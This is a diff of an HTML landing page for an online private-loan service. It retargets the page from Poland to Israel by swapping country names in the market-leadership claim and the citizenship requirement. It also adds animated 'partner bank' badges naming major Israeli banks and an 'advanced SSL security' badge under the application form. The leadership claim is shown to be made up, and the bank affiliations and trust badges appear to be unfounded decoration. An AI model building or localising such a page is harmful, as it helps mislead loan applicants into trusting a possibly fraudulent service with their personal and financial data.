@@ -10,7 +10,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Plus+Jakarta+Sans:wght@700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* --- STYLES COMPLETS (inchangés) --- */
+        /* --- TOUS LES STYLES (avec animations ajoutées) --- */
         :root {
             --primary: #0f172a;
             --primary-light: #1e293b;
@@ -138,6 +138,91 @@
         .footer-col a:hover { color: var(--secondary); }
         .footer-bottom { border-top: 1px solid #334155; padding-top: 30px; text-align: center; font-size: 0.9rem; }
 
+        /* --- NOUVELLES ANIMATIONS ET STYLES BANCAIRES --- */
+        @keyframes float {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-8px); }
+            100% { transform: translateY(0px); }
+        }
+        @keyframes pulse-shadow {
+            0% { box-shadow: 0 0 0 0 rgba(245, 158, 11, 0.3); }
+            70% { box-shadow: 0 0 0 10px rgba(245, 158, 11, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(245, 158, 11, 0); }
+        }
+        .bank-partners {
+            margin-top: 30px;
+            padding-top: 25px;
+            border-top: 2px solid var(--gray-200);
+            text-align: center;
+        }
+        .partner-title {
+            font-weight: 700;
+            color: var(--gray-700);
+            margin-bottom: 15px;
+            font-size: 0.95rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        .partner-title i {
+            color: #0038b8; /* Bleu israélien */
+        }
+        .partner-logos {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+        .partner-card {
+            background: var(--gray-100);
+            padding: 10px 20px;
+            border-radius: 50px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-weight: 600;
+            font-size: 0.85rem;
+            color: var(--gray-700);
+            border: 1px solid var(--gray-200);
+            transition: var(--transition);
+            cursor: default;
+            animation: float 3s ease-in-out infinite;
+        }
+        .partner-card:nth-child(2) { animation-delay: 0.4s; }
+        .partner-card:nth-child(3) { animation-delay: 0.8s; }
+        .partner-card:nth-child(4) { animation-delay: 1.2s; }
+        .partner-card:hover {
+            transform: translateY(-5px);
+            background: var(--white);
+            border-color: var(--secondary);
+            box-shadow: var(--shadow-lg);
+            animation-play-state: paused;
+        }
+        .partner-card i {
+            color: var(--secondary);
+            font-size: 1.1rem;
+        }
+        .partner-card .israel-star {
+            color: #0038b8;
+            font-size: 0.7rem;
+            margin-right: 2px;
+        }
+        .secure-badge {
+            margin-top: 18px;
+            font-size: 0.85rem;
+            color: var(--gray-500);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            animation: pulse-shadow 2s infinite;
+        }
+        .secure-badge i {
+            color: var(--success);
+            font-size: 1.1rem;
+        }
+
         @media (max-width: 992px) {
             .hero-container, .steps-grid, .features-grid, .testimonials-grid, .footer-grid, .proof-images { grid-template-columns: 1fr; }
             .hero { text-align: center; }
@@ -155,6 +240,8 @@
             .hero-title { font-size: 2.5rem; }
             .section-title { font-size: 2.2rem; }
             .form-grid { grid-template-columns: 1fr; }
+            .partner-logos { gap: 10px; }
+            .partner-card { padding: 8px 14px; font-size: 0.75rem; }
         }
     </style>
 </head>
@@ -278,6 +365,44 @@
                             <i class="fas fa-paper-plane"></i> שלח בקשה
                         </button>
                     </form>
+
+                    <!-- === NOUVELLE SECTION BANCAIRE ISRAÉLIENNE (EN BAS DU FORMULAIRE) === -->
+                    <div class="bank-partners">
+                        <div class="partner-title">
+                            <i class="fas fa-star-of-david"></i>
+                            הבנקים המובילים בישראל
+                            <i class="fas fa-star-of-david"></i>
+                        </div>
+                        <div class="partner-logos">
+                            <div class="partner-card">
+                                <i class="fas fa-university"></i>
+                                <span>לאומי</span>
+                                <span class="israel-star">✡</span>
+                            </div>
+                            <div class="partner-card">
+                                <i class="fas fa-university"></i>
+                                <span>הפועלים</span>
+                                <span class="israel-star">✡</span>
+                            </div>
+                            <div class="partner-card">
+                                <i class="fas fa-university"></i>
+                                <span>דיסקונט</span>
+                                <span class="israel-star">✡</span>
+                            </div>
+                            <div class="partner-card">
+                                <i class="fas fa-university"></i>
+                                <span>מזרחי</span>
+                                <span class="israel-star">✡</span>
+                            </div>
+                        </div>
+                        <div class="secure-badge">
+                            <i class="fas fa-shield-alt"></i>
+                            אבטחה מתקדמת – הצפנת SSL מאובטחת
+                            <i class="fas fa-lock"></i>
+                        </div>
+                    </div>
+                    <!-- ====================================================== -->
+
                 </div>
             </div>
         </section>
@@ -312,7 +437,8 @@
             <div class="container">
                 <div class="section-header">
                     <h2 class="section-title">למה כדאי לסמוך עלינו?</h2>
-                    <p class="section-subtitle">אנחנו מובילים בשוק ההלוואות הפרטיות המקוונות בפולין.</p>
+                    <!-- REMPLACÉ "Pologne" par "Israël" -->
+                    <p class="section-subtitle">אנחנו מובילים בשוק ההלוואות הפרטיות המקוונות בישראל.</p>
                 </div>
                 <div class="features-grid">
                     <div class="feature-card">
@@ -393,7 +519,8 @@
                         <i class="fas fa-chevron-down"></i>
                     </div>
                     <div class="faq-answer">
-                        <p>כל אדם בגיר בעל אזרחות פולנית, תעודת זהות בתוקף, חשבון בנק והכנסה קבועה.</p>
+                        <!-- REMPLACÉ "Polonaise" par "Israélienne" -->
+                        <p>כל אדם בגיר בעל אזרחות ישראלית, תעודת זהות בתוקף, חשבון בנק והכנסה קבועה.</p>
                     </div>
                 </div>
                 <div class="faq-item">
